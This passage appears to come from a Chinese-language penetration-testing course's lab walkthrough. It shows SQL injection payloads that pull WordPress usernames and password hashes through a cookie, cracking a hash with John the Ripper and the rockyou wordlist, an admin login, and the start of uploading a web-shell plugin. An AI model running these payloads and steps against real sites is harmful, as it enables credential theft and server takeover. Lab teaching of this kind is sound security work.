
`"1569149780") OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns WHERE table_name='wp_users'#"`

```
列表 868 - `wp_users` 表中所有列的列表
```

与之前的 payload 一样，此 payload 也将放置在 Repeater 选项卡中的 `wp_sap` cookie 值中。

![](img/ec25e59d75726b7041242a56d3376832_754_0.png)

我们的查询结果揭示了几个列名。对我们最感兴趣的是 `user_login` 和 `user_pass`，因为它们很可能包含用于验证该 WordPress 实例凭据的信息。

接下来，让我们查询用户名。为此，我们需要发送一个 SQL 注入请求，要求获取 `wp_users` 表中所有 `user_login` 值。这可以通过按如下方式更新我们的查询来实现。

```
["15650149780'") OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#"]
```

列表 869 - 列出所有用户名

我们再次重复之前的注入。

![](img/ec25e59d75726b7041242a56d3376832_755_0.png)

此查询仅公开了一个用户名：`wp_ajla_admin`。既然有了用户名，是时候获取密码哈希了。

为此，我们需要将查询中的 `user_login` 替换为 `user_pass`。

```
["1650149780')]  OR 1=2  UNION  SELECT  1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users#"]
```

列表 870 - 列出所有密码

![](img/ec25e59d75726b7041242a56d3376832_756_0.png)

图 330：查询 `wp_users` 中的所有密码

作为注入的结果，我们成功恢复了管理员的密码哈希。注意末尾的编码；响应中包含三个 `""` 字符以转义单个 `"`。在尝试对 web 应用程序进行身份验证之前，需要破解此哈希值。

## 24.2.2.2 练习

- 使用 `sqlmap` 利用 SQL 注入并提取用户名和密码。

### 24.2.3 破解密码

既然我们有了密码哈希，我们需要破解它以获取明文密码。虽然我们可以运行传统的暴力破解攻击，尝试每个字母组合希望有一个匹配，但这可能需要很长时间。相反，我们选择使用 Kali Linux 中包含的 "rockyou" 词库开始。

> 如果你还没有这样做，可以使用 `gunzip` 解压 `/usr/share/wordlists/rockyou.txt.gz` 文件来扩展存档。这将用纯文本文件替换存档文件。

在继续之前，让我们创建一个包含密码哈希的文件。

```
kali@kali:~$ echo "$P$BfBI166MsPQgzmvYsUzwrjC5vSx9L6I/" > pass.txt
```

列表 871 - 将密码添加到文件

让我们尝试使用 John the Ripper 破解密码。我们将使用 `wordlist` 选项以及词库的路径，并提供包含密码哈希的文件名。

```
kali@kali:~/Desktop/sandbox.local$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt

!1ove29jan2006! (?)

lg 0:00:22:59 DONE 0.000724g/s 10391p/s 10391c/s 10391C/s l!ovegod..!lov3h\m

Use "--show --format=phpass" to display all of the cracked passwords reliably

Session completed
```

列表 872 - 运行 John the Ripper

运行上述命令可能需要很长时间，具体取决于计算机的 CPU。根据列表 872 中的输出，John 指出密码是 "love29jan2006!"。让我们尝试看看我们是否可以登录 web 应用程序。

默认情况下，WordPress 登录页面位于 `/wp-admin`。访问此页面会提示我们输入用户名和密码。

![](img/ec25e59d75726b7041242a56d3376832_757_0.png)

![](img/ec25e59d75726b7041242a56d3376832_757_1.png)

一旦我们点击登录，就可以进入管理员仪表板。

![](img/ec25e59d75726b7041242a56d3376832_758_0.png)

图 332：成功登录

> 可能会出现请求验证管理员电子邮件地址的情况。如果是这种情况，只需点击“此电子邮件正确”即可继续。

既然我们已经登录，就可以继续我们的信息收集旅程，以发现下一步应该利用什么。

#### 24.2.4 枚举管理界面

登录管理界面为进一步利用打开了大门。在我们开始探索提升当前访问权限的方法之前，让我们先调查一下 WordPress 提供的选项。

在 WordPress 中，一个很好的起点是工具 > 站点健康部分的*信息*选项卡。

![](img/ec25e59d75726b7041242a56d3376832_759_0.png)

图 333。查看 WordPress 信息页面

在此页面上，我们可以确定服务器正在使用 PHP 版本 7.0.33-0ubuntu0.16.04.7 运行 WordPress。我们还发现数据库正在 IP 地址 10.5.5.11 上运行，这与我们当前正在针对的目标不同。这并不罕见，因为数据库和 Web 应用程序通常运行在单独的服务器上。

既然我们已经收集了一些基本信息，就可以尝试提升我们的访问权限。拥有 WordPress 管理权限的一个便利之处是我们可以安装自己的插件。WordPress 中的插件是用 PHP 编写的，且限制较少。例如，我们可以上传一个包含 PHP 反向 Shell 或代码执行功能的插件。幸运的是，其他人已经为此目的创建了恶意插件。

其中一个这样的插件可以在 `seclists` 包中找到，可以通过 `apt` 在 Kali 中安装。

```
kali@kali:~$ sudo apt install seclists
```

Listing 873 - Installing the seclists package

安装完成后，seclists 目录可以在 `/usr/share/seclists` 中找到，而我们要找的文件可以在 Web-Shells/WordPress 中找到。

```
kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress
kali@kali:/usr/share/seclists/Web-Shells/WordPress$ ls
bypass-login.php plugin-shell.php
```

Listing 874 - Listing seclists WordPress web shells

我们要找的具体文件是 `plugin-shell.php`。让我们快速检查一下它，看看它是做什么的。

```
1 <?php
2 /*
3 Plugin Name: Cheap & Nasty Wordpress Shell
4 Plugin URI: https://github.com/leonjza/wordpress-shell
5 Description: Execute Commands as the webserver you are serving wordpress with!
Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given
using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.
php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>
Author: Leon Jacobs
Version: 0.3
Author URI: https://leonjza.github.io
9 */
```

Listing 875 - WordPress plugin shell comments

Listing 875 中的第 2-9 行是注释，对于 WordPress 识别该文件为插件是必需的。
